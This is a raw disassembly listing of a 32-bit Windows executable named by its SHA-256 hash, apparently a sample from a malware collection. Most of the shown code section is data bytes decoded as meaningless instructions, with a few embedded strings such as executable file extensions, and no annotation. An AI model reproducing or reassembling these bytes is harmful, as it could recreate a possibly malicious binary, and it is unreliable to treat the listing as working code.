
2a053f32b1d48539e3e2807f86754be87ce95b08378467e66cab2bac0e67a825.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	push   ecx
  401005:	sti    
  401006:	inc    eax
	...
  40100f:	add    BYTE PTR [edx+edi*8+0x40],ch
  401013:	add    BYTE PTR [eax+0x7b0040fa],bl
  401019:	add    DWORD PTR [ecx+0x0],eax
  40101c:	imul   edi,edi,0x40
	...
  401033:	add    BYTE PTR [edi-0x2e],cl
  401036:	adc    DWORD PTR [eax+0x0],edx
  401039:	add    BYTE PTR [eax],al
  40103b:	add    BYTE PTR [edx],al
  40103d:	add    BYTE PTR [eax],al
  40103f:	add    BYTE PTR [edx],ah
  401041:	add    BYTE PTR [eax],al
  401043:	add    BYTE PTR [eax],al
  401045:	daa    
  401046:	add    BYTE PTR [eax],al
  401048:	add    BYTE PTR [ebx],bl
	...
  401066:	add    BYTE PTR [eax],al
  401068:	push   ebx
  401069:	gs je  0x4010bc
  40106c:	jb     0x4010dd
  40106e:	arpl   WORD PTR [ebp+0x73],sp
  401071:	jae    0x4010b7
  401073:	inc    ebp
  401074:	push   eax
  401075:	push   eax
  401076:	outs   dx,DWORD PTR ds:[esi]
  401077:	ins    BYTE PTR es:[edi],dx
  401078:	imul   esp,DWORD PTR [ebx+0x79],0x41118000
  40107f:	add    al,dl
  401081:	adc    DWORD PTR [ecx+0x0],eax
  401084:	and    al,0x0
  401086:	add    BYTE PTR [eax],al
  401088:	sub    al,BYTE PTR [eax]
  40108a:	aas    
  40108b:	add    BYTE PTR [eax],al
  40108d:	add    BYTE PTR [eax],al
  40108f:	add    BYTE PTR [eax],ah
  401091:	add    BYTE PTR [ecx],cl
  401093:	add    BYTE PTR [eax],al
  401095:	add    BYTE PTR [eax],al
  401097:	add    BYTE PTR [edx],ah
  401099:	add    BYTE PTR [eax],al
  40109b:	add    BYTE PTR [edx],ah
  40109d:	add    BYTE PTR [eax],ah
  40109f:	add    BYTE PTR [eax],al
  4010a1:	add    BYTE PTR [eax],al
  4010a3:	add    BYTE PTR [eax],ah
	...
  4010c9:	add    al,BYTE PTR [eax]
  4010cb:	add    BYTE PTR [eax],al
  4010cd:	add    al,BYTE PTR [edx]
  4010cf:	add    BYTE PTR [edx],al
  4010d1:	add    al,BYTE PTR [edx]
  4010d3:	add    al,BYTE PTR [eax]
  4010d5:	add    BYTE PTR [eax],al
  4010d7:	add    al,BYTE PTR [ecx]
  4010d9:	add    DWORD PTR [ecx],eax
  4010db:	add    DWORD PTR [ecx],eax
  4010dd:	add    DWORD PTR [ecx],eax
  4010df:	add    DWORD PTR [ecx],eax
  4010e1:	add    DWORD PTR [eax],eax
  4010e3:	add    BYTE PTR [edx],al
  4010e5:	add    al,BYTE PTR [edx]
  4010e7:	add    BYTE PTR [eax],al
  4010e9:	add    DWORD PTR [ecx],eax
  4010eb:	add    DWORD PTR [ecx],eax
  4010ed:	add    DWORD PTR [ecx],eax
  4010ef:	add    DWORD PTR [ecx],eax
  4010f1:	add    DWORD PTR [ecx],eax
  4010f3:	add    DWORD PTR [ecx],eax
  4010f5:	add    DWORD PTR [ecx],eax
  4010f7:	add    DWORD PTR [ecx],eax
  4010f9:	add    DWORD PTR [ecx],eax
  4010fb:	add    DWORD PTR [ecx],eax
  4010fd:	add    DWORD PTR [ecx],eax
  4010ff:	add    DWORD PTR [ecx],eax
  401101:	add    DWORD PTR [ecx],eax
  401103:	add    BYTE PTR [eax],al
  401105:	add    BYTE PTR [edx],al
  401107:	add    DWORD PTR [eax],eax
  401109:	add    DWORD PTR [ecx],eax
  40110b:	add    DWORD PTR [ecx],eax
  40110d:	add    DWORD PTR [ecx],eax
  40110f:	add    DWORD PTR [ecx],eax
  401111:	add    DWORD PTR [ecx],eax
  401113:	add    DWORD PTR [ecx],eax
  401115:	add    DWORD PTR [ecx],eax
  401117:	add    DWORD PTR [ecx],eax
  401119:	add    DWORD PTR [ecx],eax
  40111b:	add    DWORD PTR [ecx],eax
  40111d:	add    DWORD PTR [ecx],eax
  40111f:	add    DWORD PTR [ecx],eax
  401121:	add    DWORD PTR [ecx],eax
  401123:	add    BYTE PTR [edx],al
  401125:	add    BYTE PTR [edx],al
  401127:	add    BYTE PTR [esi],ch
  401129:	add    BYTE PTR [ebx+0x0],al
  40112c:	dec    edi
  40112d:	add    BYTE PTR [ebp+0x0],cl
  401130:	cmp    eax,DWORD PTR [eax]
  401132:	add    BYTE PTR cs:[ebp+0x0],al
  401136:	pop    eax
  401137:	add    BYTE PTR [ebp+0x0],al
  40113a:	cmp    eax,DWORD PTR [eax]
  40113c:	add    BYTE PTR cs:[edx+0x0],al
  401140:	inc    ecx
  401141:	add    BYTE PTR [eax+eax*1+0x3b],dl
  401145:	add    BYTE PTR [esi],ch
  401147:	add    BYTE PTR [ebx+0x0],al
  40114a:	dec    ebp
  40114b:	add    BYTE PTR [eax+eax*1+0x3b],al
  40114f:	add    BYTE PTR [esi],ch
  401151:	add    BYTE PTR [esi+0x0],dl
  401154:	inc    edx
  401155:	add    BYTE PTR [ebx+0x0],dl
  401158:	cmp    eax,DWORD PTR [eax]
  40115a:	add    BYTE PTR cs:[edx+0x0],cl
  40115e:	push   ebx
  40115f:	add    BYTE PTR [ebx],bh
  401161:	add    BYTE PTR [esi],ch
  401163:	add    BYTE PTR [edi+0x0],dl
  401166:	push   ebx
  401167:	add    BYTE PTR [eax],al
  401169:	add    BYTE PTR [eax],al
  40116b:	add    BYTE PTR [esi],ch
  40116d:	add    BYTE PTR [eax+0x0],dl
  401170:	push   edx
  401171:	add    BYTE PTR [ebp+0x0],al
  401174:	inc    ebx
  401175:	add    BYTE PTR [ecx+0x0],cl
  401178:	dec    edi
  401179:	add    BYTE PTR [ebp+0x0],dl
  40117c:	push   ebx
  40117d:	add    BYTE PTR [eax],al
  40117f:	add    BYTE PTR [esi],ch
  401181:	add    BYTE PTR [ebx+0x0],dl
  401184:	push   ebp
  401185:	add    BYTE PTR [esi+0x0],al
  401188:	inc    esi
  401189:	add    BYTE PTR [ecx+0x0],cl
  40118c:	pop    eax
  40118d:	add    BYTE PTR [ebp+0x0],al
  401190:	push   ebx
  401191:	add    BYTE PTR [eax],al
  401193:	add    BYTE PTR [esi],ch
  401195:	add    BYTE PTR [ecx+0x0],cl
  401198:	inc    edi
  401199:	add    BYTE PTR [esi+0x0],cl
  40119c:	dec    edi
  40119d:	add    BYTE PTR [edx+0x0],dl
  4011a0:	inc    ebp
  4011a1:	add    BYTE PTR [eax],al
  4011a3:	add    BYTE PTR [esi],ch
  4011a5:	add    BYTE PTR [ebx+0x0],dl
  4011a8:	dec    ecx
  4011a9:	add    BYTE PTR [eax+eax*1+0x45],cl
  4011ad:	add    BYTE PTR [esi+0x0],cl
  4011b0:	push   esp
  4011b1:	add    BYTE PTR [eax],al
  4011b3:	add    BYTE PTR [edx+edx*1+0x40],dl
  4011b7:	add    BYTE PTR [eax+0x12],cl
  4011ba:	inc    eax
  4011bb:	add    BYTE PTR [edx+edx*1],bh
  4011be:	inc    eax
  4011bf:	add    BYTE PTR [eax],dh
  4011c1:	adc    al,BYTE PTR [eax+0x0]
  4011c4:	and    al,0x12
  4011c6:	inc    eax
  4011c7:	add    BYTE PTR [eax],dh
  4011c9:	adc    al,BYTE PTR [eax+0x0]
  4011cc:	and    al,0x12
  4011ce:	inc    eax
  4011cf:	add    BYTE PTR [eax],bl
  4011d1:	adc    al,BYTE PTR [eax+0x0]
  4011d4:	or     al,0x12
  4011d6:	inc    eax
  4011d7:	add    BYTE PTR [eax],al
  4011d9:	adc    al,BYTE PTR [eax+0x0]
  4011dc:	hlt    
  4011dd:	adc    DWORD PTR [eax+0x0],eax
  4011e0:	call   0x4051f6
  4011e5:	add    BYTE PTR [eax],al
  4011e7:	add    BYTE PTR [eax+0x7c00401a],ah
  4011ed:	sbb    al,0x40
  4011ef:	add    BYTE PTR [eax],al
  4011f1:	add    BYTE PTR [eax],al
  4011f3:	add    BYTE PTR [ebx+ebx*1],dh
  4011f6:	inc    eax
  4011f7:	add    BYTE PTR [eax+0x1c],cl
  4011fa:	inc    eax
  4011fb:	add    BYTE PTR [eax],al
  4011fd:	add    BYTE PTR [eax],al
  4011ff:	add    BYTE PTR [eax+0x1c00401a],ah
  401205:	sbb    al,0x40
  401207:	add    BYTE PTR [eax],al
  401209:	add    BYTE PTR [eax],al
  40120b:	add    BYTE PTR [ebx+ebx*1],dh
  40120e:	inc    eax
  40120f:	add    al,ch
  401211:	sbb    eax,DWORD PTR [eax+0x0]
  401214:	add    BYTE PTR [eax],al
  401216:	add    BYTE PTR [eax],al
  401218:	mov    al,ds:0xbc00401a
  40121d:	sbb    eax,DWORD PTR [eax+0x0]
  401220:	add    BYTE PTR [eax],al
  401222:	add    BYTE PTR [eax],al
  401224:	xor    al,0x1b
  401226:	inc    eax
  401227:	add    BYTE PTR [eax+0x401b],dl
  40122d:	add    BYTE PTR [eax],al
  40122f:	add    BYTE PTR [eax+0x6800401a],ah
  401235:	sbb    eax,DWORD PTR [eax+0x0]
  401238:	add    BYTE PTR [eax],al
  40123a:	add    BYTE PTR [eax],al
  40123c:	xor    al,0x1b
  40123e:	inc    eax
  40123f:	add    BYTE PTR [ebx+ebx*1],bh
  401242:	inc    eax
  401243:	add    BYTE PTR [eax],al
  401245:	add    BYTE PTR [eax],al
  401247:	add    BYTE PTR [eax+0xc00401a],ah
  40124d:	sbb    eax,DWORD PTR [eax+0x0]
  401250:	add    BYTE PTR [eax],al
  401252:	add    BYTE PTR [eax],al
  401254:	mov    al,ds:0xa400401a
  401259:	sbb    al,BYTE PTR [eax+0x0]
  40125c:	mov    al,0x1a
  40125e:	inc    eax
  40125f:	add    BYTE PTR [edx+ebx*1+0x1ac40040],bh
  401266:	inc    eax
  401267:	add    ah,cl
  401269:	sbb    al,BYTE PTR [eax+0x0]
  40126c:	fcomp  DWORD PTR [edx]
  40126e:	inc    eax
  40126f:	add    ah,ah
  401271:	sbb    al,BYTE PTR [eax+0x0]
  401274:	in     al,dx
  401275:	sbb    al,BYTE PTR [eax+0x0]
  401278:	clc    
  401279:	sbb    al,BYTE PTR [eax+0x0]
  40127c:	add    al,0x1b
  40127e:	inc    eax
  40127f:	add    BYTE PTR [eax],al
  401281:	add    BYTE PTR [eax],al
  401283:	add    ah,al
  401285:	sbb    DWORD PTR [eax+0x0],eax
  401288:	fcomp  DWORD PTR [ecx]
  40128a:	inc    eax
  40128b:	add    ah,ch
  40128d:	sbb    DWORD PTR [eax+0x0],eax
  401290:	add    BYTE PTR [edx],bl
  401292:	inc    eax
  401293:	add    BYTE PTR [eax],dl
  401295:	sbb    al,BYTE PTR [eax+0x0]
  401298:	and    BYTE PTR [edx],bl
  40129a:	inc    eax
  40129b:	add    BYTE PTR [eax],dh
  40129d:	sbb    al,BYTE PTR [eax+0x0]
  4012a0:	inc    eax
  4012a1:	sbb    al,BYTE PTR [eax+0x0]
  4012a4:	push   esp
  4012a5:	sbb    al,BYTE PTR [eax+0x0]
  4012a8:	push   0x7c00401a
  4012ad:	sbb    al,BYTE PTR [eax+0x0]
  4012b0:	nop
  4012b1:	sbb    al,BYTE PTR [eax+0x0]
  4012b4:	add    BYTE PTR [eax],al
  4012b6:	add    BYTE PTR [eax],al
  4012b8:	add    DWORD PTR [eax+0x40],eax
  4012bb:	inc    eax
  4012bc:	add    DWORD PTR [eax+0x40],eax
  4012bf:	add    al,BYTE PTR [ecx]
  4012c1:	add    DWORD PTR [ecx],eax
  4012c3:	or     BYTE PTR [ecx],al
  4012c5:	movups xmm0,XMMWORD PTR [ecx]
  4012c8:	inc    eax
  4012c9:	inc    eax
  4012ca:	inc    eax
  4012cb:	inc    eax
  4012cc:	inc    eax
  4012cd:	inc    eax
  4012ce:	add    al,BYTE PTR [ecx]
  4012d0:	add    DWORD PTR [ecx],eax
  4012d2:	or     BYTE PTR [ecx],al
  4012d4:	(bad)  
  4012d6:	and    DWORD PTR [edx],esp
  4012d8:	and    DWORD PTR [ecx],esp
  4012da:	and    DWORD PTR [edx],esp
  4012dc:	and    al,BYTE PTR [ecx]
  4012de:	add    esp,DWORD PTR [ecx]
  4012e0:	add    DWORD PTR [ecx],esp
  4012e2:	and    DWORD PTR [ecx],esp
  4012e4:	and    DWORD PTR [ecx],esp
  4012e6:	and    BYTE PTR [ecx],ah
  4012e8:	and    DWORD PTR [esp],esp
  4012eb:	and    BYTE PTR [ecx],ah
  4012ed:	and    DWORD PTR [esp+eax*1],esp
  4012f0:	and    DWORD PTR [ecx],esp
  4012f2:	and    DWORD PTR [ecx],esp
  4012f4:	and    DWORD PTR [eax],esp
  4012f6:	and    DWORD PTR [ecx],esp
  4012f8:	add    eax,0x21212020
  4012fd:	add    DWORD PTR [ecx+eiz*1],eax
  401300:	and    DWORD PTR [ecx],esp
  401302:	and    DWORD PTR [esi],eax
  401304:	push   es
  401305:	and    eax,0x20060606
  40130a:	push   es
  40130b:	push   es
  40130c:	and    eax,DWORD PTR [esi]
  40130e:	push   es
  40130f:	push   es
  401310:	push   es
  401311:	push   es
  401312:	push   es
  401313:	push   es
  401314:	pop    es
  401315:	push   es
  401316:	push   es
  401317:	push   es
  401318:	and    eax,0x6250606
  40131d:	push   es
  40131e:	push   es
  40131f:	push   es
  401320:	push   es
  401321:	pop    es
  401322:	pop    es
  401323:	pop    es
  401324:	pop    es
  401325:	pop    es
  401326:	pop    es
  401327:	and    eax,0x7010707
  40132c:	pop    es
  40132d:	pop    es
  40132e:	pop    es
  40132f:	pop    es
  401330:	or     BYTE PTR [eax+0x8],al
  401333:	or     BYTE PTR [eax],cl
  401335:	or     BYTE PTR [eax+0x9],al
  401338:	or     BYTE PTR [eax],cl
  40133a:	or     BYTE PTR [eax],cl
  40133c:	adc    cl,BYTE PTR [eax]
  40133e:	or     BYTE PTR [ecx],ah
  401340:	and    ah,BYTE PTR [ecx]
  401342:	and    DWORD PTR [ecx],esp
  401344:	and    ah,BYTE PTR [edx]
  401346:	or     BYTE PTR [edx],cl
  401348:	and    DWORD PTR [eax],ecx
  40134a:	and    DWORD PTR [ecx],esp
  40134c:	and    DWORD PTR [ecx],esp
  40134e:	and    DWORD PTR [eax],esp
  401350:	and    DWORD PTR [ecx],esp
  401352:	and    al,0xa
  401354:	and    BYTE PTR [ecx],ah
  401356:	and    DWORD PTR [ebx+ecx*1],esp
  401359:	and    DWORD PTR [ecx],esp
  40135b:	and    DWORD PTR [ecx],esp
  40135d:	and    DWORD PTR [eax],esp
  40135f:	and    DWORD PTR [ecx],esp
  401361:	or     al,0x20
  401363:	and    BYTE PTR [ecx],ah
  401365:	and    DWORD PTR [eax],ecx
  401367:	or     esp,DWORD PTR [ecx]
  401369:	and    DWORD PTR [ecx],esp
  40136b:	and    DWORD PTR ds:0xd0d250d,ecx
  401371:	or     eax,0x230d0d20
  401376:	or     eax,0xd0d0d0d
  40137b:	or     eax,0xd0d0e0d
  401380:	or     eax,0x250d0d25
  401385:	or     eax,0xd0d0d0d
  40138a:	push   cs
  40138b:	push   cs
  40138c:	push   cs
  40138d:	push   cs
  40138e:	push   cs
  40138f:	push   cs
  401390:	and    eax,0xe080e0e
  401395:	push   cs
  401396:	push   cs
  401397:	push   cs
  401398:	push   cs
  401399:	add    DWORD PTR [eax+0x40],eax
  40139c:	inc    eax
  40139d:	inc    eax
  40139e:	inc    eax
  40139f:	inc    eax
  4013a0:	add    al,BYTE PTR [ecx]
  4013a2:	add    DWORD PTR [ecx],eax
  4013a4:	or     BYTE PTR [ecx],al
  4013a6:	add    DWORD PTR [ecx],eax
  4013a8:	adc    BYTE PTR [eax],dl
  4013aa:	adc    BYTE PTR [eax],dl
  4013ac:	adc    BYTE PTR [eax],dl
  4013ae:	add    dl,BYTE PTR es:[eax]
  4013b1:	adc    BYTE PTR [eax],dl
  4013b3:	or     BYTE PTR [eax],dl
  4013b5:	movups XMMWORD PTR [eax+0x40],xmm0
  4013b9:	inc    eax
  4013ba:	inc    eax
  4013bb:	inc    eax
  4013bc:	inc    eax
  4013bd:	inc    eax
  4013be:	inc    eax
  4013bf:	inc    eax
  4013c0:	inc    eax
  4013c1:	inc    eax
  4013c2:	inc    eax
  4013c3:	inc    eax
  4013c4:	inc    eax
  4013c5:	inc    eax
  4013c6:	add    DWORD PTR [eax+0x40],eax
  4013c9:	inc    eax
  4013ca:	inc    eax
  4013cb:	inc    eax
  4013cc:	inc    eax
  4013cd:	add    al,BYTE PTR [ecx]
  4013cf:	add    DWORD PTR [ecx],eax
  4013d1:	or     BYTE PTR [ecx],al
  4013d3:	movups xmm0,XMMWORD PTR [eax]
  4013d6:	add    BYTE PTR [eax],al
  4013d8:	add    DWORD PTR [edx],eax
  4013da:	add    DWORD PTR [ebx],eax
  4013dc:	add    DWORD PTR [edx],eax
  4013de:	inc    eax
  4013df:	add    al,0x1
  4013e1:	add    DWORD PTR [ecx],eax
  4013e3:	add    DWORD PTR [ecx],eax
  4013e5:	add    DWORD PTR [ecx],eax
  4013e7:	add    DWORD PTR [ecx],eax
  4013e9:	add    eax,DWORD PTR [ecx]
  4013eb:	add    al,BYTE PTR [eax+0x4]
  4013ee:	add    DWORD PTR [ecx],eax
  4013f0:	add    DWORD PTR [ecx],eax
  4013f2:	add    DWORD PTR [ecx],eax
  4013f4:	add    DWORD PTR [ecx],eax
  4013f6:	add    DWORD PTR [ebx],eax
  4013f8:	add    DWORD PTR [edx],eax
  4013fa:	inc    eax
  4013fb:	add    al,0x1
  4013fd:	add    DWORD PTR [ecx],eax
  4013ff:	add    DWORD PTR [ecx],eax
  401401:	add    DWORD PTR [ecx],eax
  401403:	add    DWORD PTR [ecx],eax
  401405:	add    DWORD PTR [ecx],eax
  401407:	add    al,BYTE PTR [eax]
  401409:	add    al,0x1
  40140b:	add    DWORD PTR [ecx],eax
  40140d:	add    DWORD PTR [ecx],eax
  40140f:	add    DWORD PTR [ecx],esp
  401411:	and    DWORD PTR [ecx],esp
  401413:	and    DWORD PTR [ecx],esp
  401415:	and    ah,BYTE PTR [edx]
  401417:	add    DWORD PTR ds:0x1010121,eax
  40141d:	add    DWORD PTR [ecx],esp
  40141f:	and    DWORD PTR [ecx],esp
  401421:	and    DWORD PTR [ecx],esp
  401423:	and    al,0x20
  401425:	and    DWORD PTR [ecx],esp
  401427:	and    al,0x6
  401429:	or     ecx,DWORD PTR [eax]
  40142b:	push   es
  40142c:	and    DWORD PTR [ecx],esp
  40142e:	and    DWORD PTR [ecx],esp
  401430:	or     DWORD PTR [eax],esp
  401432:	and    BYTE PTR [ecx],ah
  401434:	and    DWORD PTR [edx],eax
  401436:	push   es
  401437:	and    ah,BYTE PTR [edx]
  401439:	push   es
  40143a:	and    DWORD PTR [ecx],esp
  40143c:	and    DWORD PTR [ecx],esp
  40143e:	or     DWORD PTR [eax],esp
  401440:	and    BYTE PTR [ecx],ah
  401442:	and    DWORD PTR [edx],eax
  401444:	and    ah,BYTE PTR [edx]
  401446:	and    ah,BYTE PTR [edx]
  401448:	and    DWORD PTR [ecx],esp
  40144a:	and    DWORD PTR [ecx],esp
  40144c:	or     DWORD PTR [eax],esp
  40144e:	and    BYTE PTR [ecx],ah
  401450:	and    DWORD PTR [edx],eax
  401452:	and    ah,BYTE PTR [edx]
  401454:	and    al,BYTE PTR [edi]
  401456:	or     cl,BYTE PTR [edx]
  401458:	and    eax,0x200a0a0a
  40145d:	or     cl,BYTE PTR [edx]
  40145f:	and    eax,0xa0a0a0a
  401464:	or     cl,BYTE PTR [edx]
  401466:	or     al,0xa
  401468:	or     cl,BYTE PTR [edx]
  40146a:	and    BYTE PTR [edx],cl
  40146c:	or     ah,BYTE PTR [ebx]
  40146e:	or     cl,BYTE PTR [edx]
  401470:	or     cl,BYTE PTR [edx]
  401472:	and    DWORD PTR [ecx],esp
  401474:	and    DWORD PTR [ecx],esp
  401476:	or     DWORD PTR [eax],esp
  401478:	and    BYTE PTR [ecx],ah
  40147a:	and    DWORD PTR [edx],eax
  40147c:	and    cl,BYTE PTR [eax]
  40147e:	and    al,BYTE PTR [edi]
  401480:	or     al,0xc
  401482:	or     al,0xc
  401484:	or     al,0xc
  401486:	and    BYTE PTR [esp+ecx*1],cl
  401489:	add    cl,BYTE PTR [esp+ecx*1]
  40148c:	or     al,0xc
  40148e:	add    BYTE PTR [eax],al
  401490:	pusha  
  401491:	daa    
  401492:	inc    eax
  401493:	add    BYTE PTR [edi-0x3bffbfd9],al
  401499:	das    
  40149a:	inc    eax
  40149b:	add    BYTE PTR [eax+0x2d],dl
  40149e:	inc    eax
  40149f:	add    BYTE PTR [ecx+ebp*1+0x40],dh
  4014a3:	add    BYTE PTR [ebp+0x100402e],al
  4014a9:	add    BYTE PTR [eax],al
  4014ab:	add    DWORD PTR [ecx],eax
  4014ad:	add    DWORD PTR [ecx],eax
  4014af:	add    BYTE PTR [eax],al
  4014b1:	add    DWORD PTR [ecx],eax
  4014b3:	add    BYTE PTR [eax],al
  4014b5:	add    BYTE PTR [eax],al
  4014b7:	add    DWORD PTR [eax],eax
  4014b9:	add    DWORD PTR [ecx],eax
  4014bb:	add    BYTE PTR [eax],al
  4014bd:	add    BYTE PTR [eax],al
  4014bf:	add    BYTE PTR [edx],ah
  4014c1:	add    DWORD PTR [ecx],0x20252521
  4014c7:	add    BYTE PTR [ecx],ah
  4014c9:	lea    ecx,[edi]
  4014cb:	and    DWORD PTR [ecx],esp
  4014cd:	and    DWORD PTR [ecx],esp
  4014cf:	or     eax,0x270a8b27
  4014d4:	and    DWORD PTR [ecx],esp
  4014d6:	and    DWORD PTR [ebx],ecx
  4014d8:	daa    
  4014d9:	pop    es
  4014da:	or     BYTE PTR [ecx],cl
  4014dc:	and    DWORD PTR [ecx],esp
  4014de:	and    DWORD PTR [edi],eax
  4014e0:	add    esp,DWORD PTR [ebx]
  4014e2:	and    esp,DWORD PTR [edx]
  4014e4:	add    eax,DWORD PTR [ebx]
  4014e6:	add    al,0x23
  4014e8:	push   es
  4014e9:	add    eax,0x5050505
  4014ee:	and    al,0x5
  4014f0:	adc    DWORD PTR [eax],edx
  4014f2:	adc    DWORD PTR [ecx],edx
  4014f4:	and    DWORD PTR [ecx],esp
  4014f6:	and    DWORD PTR [eax],edx
  4014f8:	daa    
  4014f9:	and    ah,BYTE PTR [edx]
  4014fb:	and    dl,BYTE PTR [edx]
  4014fd:	adc    esp,DWORD PTR [ecx]
  4014ff:	and    dl,bh
  401501:	adc    eax,DWORD PTR [eax+0x0]
  401504:	cwde   
  401505:	adc    eax,0x15900040
  40150a:	inc    eax
  40150b:	add    BYTE PTR [eax-0x7bffbfeb],cl
  401511:	adc    eax,0x13d60040
  401516:	inc    eax
  401517:	add    BYTE PTR [eax-0x2affbfeb],al
  40151d:	adc    eax,DWORD PTR [eax+0x0]
  401520:	jl     0x401537
  401522:	inc    eax
  401523:	add    BYTE PTR [ebp+edx*1+0x40],dh
  401527:	add    BYTE PTR [ebp+edx*1+0x40],ch
  40152b:	add    BYTE PTR [ebx+0x11],ch
  40152e:	inc    eax
  40152f:	add    BYTE PTR [eax+0x15],ch
  401532:	inc    eax
  401533:	add    BYTE PTR [edx+0x11],ch
  401536:	inc    eax
  401537:	add    BYTE PTR [ebp+edx*1+0x40],ah
  40153b:	add    BYTE PTR [eax+0x15],ah
  40153e:	inc    eax
  40153f:	add    BYTE PTR [ebp+edx*1+0x40],bl
  401543:	add    BYTE PTR [eax+0x15],bl
  401546:	inc    eax
  401547:	add    BYTE PTR [ebp+edx*1+0x40],dl
  40154b:	add    BYTE PTR [eax+0x15],dl
  40154e:	inc    eax
  40154f:	add    BYTE PTR [ecx],al
  401551:	adc    eax,0x14010000
  401556:	add    BYTE PTR [eax],al
  401558:	add    eax,DWORD PTR ds:0x43010343
  40155e:	add    BYTE PTR [eax],al
  401560:	add    dl,BYTE PTR [edx]
  401562:	add    DWORD PTR [eax],eax
  401564:	add    dl,BYTE PTR [ecx]
  401566:	add    DWORD PTR [eax],eax
  401568:	add    dl,BYTE PTR [ecx]
  40156a:	add    al,BYTE PTR [eax]
  40156c:	add    al,0x12
  40156e:	sbb    BYTE PTR [ecx+0x2],al
  401571:	add    BYTE PTR [eax],al
  401573:	add    BYTE PTR [ebx+edx*1],al
  401576:	sbb    BYTE PTR [ecx+0x2],al
  401579:	add    BYTE PTR [eax],al
  40157b:	add    BYTE PTR [ecx],al
  40157d:	add    al,BYTE PTR [eax]
  40157f:	add    BYTE PTR [ebx],al
  401581:	adc    BYTE PTR [ecx+0x5],al
  401584:	add    edx,DWORD PTR [esi]
  401586:	sbb    DWORD PTR [edx+0x5],eax
  401589:	add    eax,0x45064407
  40158e:	add    BYTE PTR [eax],al
  401590:	add    eax,0x4401011
  401595:	add    BYTE PTR [eax],al
  401597:	add    BYTE PTR [edx],al
  401599:	add    DWORD PTR [eax],eax
  40159b:	add    BYTE PTR [eax+eax*1+0x46],al
  40159f:	add    BYTE PTR [edx+0x0],al
  4015a2:	push   edx
  4015a3:	add    BYTE PTR [eax],al
  4015a5:	add    BYTE PTR [eax],al
  4015a7:	add    BYTE PTR [edx],ch
  4015a9:	add    BYTE PTR [eax+0x0],al
  4015ac:	cmp    al,0x0
  4015ae:	aas    
  4015af:	add    BYTE PTR [eax],al
  4015b1:	add    BYTE PTR [eax],al
  4015b3:	add    BYTE PTR [eax],ah
  4015b5:	add    BYTE PTR [ecx],cl
  4015b7:	add    BYTE PTR [edx],cl
  4015b9:	add    BYTE PTR [eax],al
  4015bb:	add    BYTE PTR [edx+0x0],dh
  4015be:	je     0x4015c0
  4015c0:	sub    al,0x0
  4015c2:	arpl   WORD PTR [eax],ax
  4015c4:	arpl   WORD PTR [eax],ax
  4015c6:	jae    0x4015c8
  4015c8:	cmp    eax,0x6e007500
  4015cd:	add    BYTE PTR [ecx+0x0],ch
  4015d0:	arpl   WORD PTR [eax],ax
  4015d2:	outs   dx,DWORD PTR ds:[esi]
  4015d3:	add    BYTE PTR [eax+eax*1+0x65],ah
  4015d7:	add    BYTE PTR [eax],al
  4015d9:	add    BYTE PTR [eax],al
  4015db:	add    BYTE PTR ds:0x28007300,ah
  4015e1:	add    BYTE PTR ds:0x29007500,ah
  4015e7:	add    BYTE PTR [eax],ah
  4015e9:	add    BYTE PTR [edx],bh
  4015eb:	add    BYTE PTR [eax],ah
  4015ed:	add    BYTE PTR [eax],al
  4015ef:	add    BYTE PTR [esi+0x0],cl
  4015f2:	dec    ebp
  4015f3:	add    BYTE PTR [ecx+0x0],al
  4015f6:	dec    ebx
  4015f7:	add    BYTE PTR [ebp+0x0],al
  4015fa:	and    BYTE PTR [eax],al
  4015fc:	cmp    al,BYTE PTR [eax]
  4015fe:	and    BYTE PTR [eax],al
  401600:	add    BYTE PTR [eax],al
  401602:	add    BYTE PTR [eax],al
  401604:	and    BYTE PTR [eax],al
  401606:	push   ebp
  401607:	add    BYTE PTR ds:0x34003000,ah
  40160d:	add    BYTE PTR [eax+eax*1+0x3a],ah
  401611:	add    BYTE PTR [eax],ah
  401613:	add    BYTE PTR [eax],al
  401615:	add    BYTE PTR [eax],al
  401617:	add    BYTE PTR [ebx+0x0],dl
  40161a:	je     0x40161c
  40161c:	outs   dx,DWORD PTR ds:[esi]
  40161d:	add    BYTE PTR [eax+0x0],dh
  401620:	add    BYTE PTR cs:[edx],cl
  401623:	add    BYTE PTR [eax],al
  401625:	add    BYTE PTR [eax],al
  401627:	add    BYTE PTR [ecx],dh
  401629:	add    BYTE PTR [ecx],dh
  40162b:	add    BYTE PTR [esi],ch
  40162d:	add    BYTE PTR [eax],dh
  40162f:	add    BYTE PTR [eax],dh
  401631:	add    BYTE PTR [esi],ch
  401633:	add    BYTE PTR ds:0x37003000,dh
  401639:	add    BYTE PTR [edx],dh
  40163b:	add    BYTE PTR [edi],dh
  40163d:	add    BYTE PTR [esi],ch
  40163f:	add    BYTE PTR [ecx],dh
  401641:	add    BYTE PTR [eax],al
  401643:	add    BYTE PTR [esi+0x0],cl
  401646:	dec    ebp
  401647:	add    BYTE PTR [ecx+0x0],al
  40164a:	dec    ebx
  40164b:	add    BYTE PTR [ebp+0x0],al
  40164e:	add    BYTE PTR [eax],al
  401650:	and    BYTE PTR [eax],al
  401652:	or     DWORD PTR [eax],eax
  401654:	and    al,BYTE PTR [eax]
  401656:	das    
  401657:	add    BYTE PTR [eax],al
  401659:	add    BYTE PTR [eax],al
  40165b:	add    BYTE PTR [ebx+0x0],dh
  40165e:	add    BYTE PTR gs:[eax+eax*1+0x20],dh
	...
  40166b:	add    BYTE PTR ds:0x73000000,ah
  401671:	add    BYTE PTR [ebp+0x0],ah
  401674:	je     0x401676
  401676:	add    BYTE PTR [eax],al
  401678:	arpl   WORD PTR [eax],ax
  40167a:	add    BYTE PTR fs:[eax],al
  40167d:	add    BYTE PTR [eax],al
  40167f:	add    BYTE PTR [ebx+0x0],ah
  401682:	push   0x69006400
  401687:	add    BYTE PTR [edx+0x0],dh
  40168a:	add    BYTE PTR [eax],al
  40168c:	and    BYTE PTR [eax],al
  40168e:	or     DWORD PTR [eax],eax
  401690:	cmp    al,0x0
  401692:	add    BYTE PTR ds:0x3c000000,cl
  401699:	add    BYTE PTR [esi],bh
  40169b:	add    BYTE PTR [eax+eax*1+0x0],bh
  40169f:	add    BYTE PTR [eax+0x0],dl
  4016a2:	inc    ecx
  4016a3:	add    BYTE PTR [eax+eax*1+0x48],dl
  4016a7:	add    BYTE PTR [ebp+0x0],al
  4016aa:	pop    eax
  4016ab:	add    BYTE PTR [eax+eax*1+0x0],dl
  4016af:	add    BYTE PTR [eax+0x0],dl
  4016b2:	inc    ecx
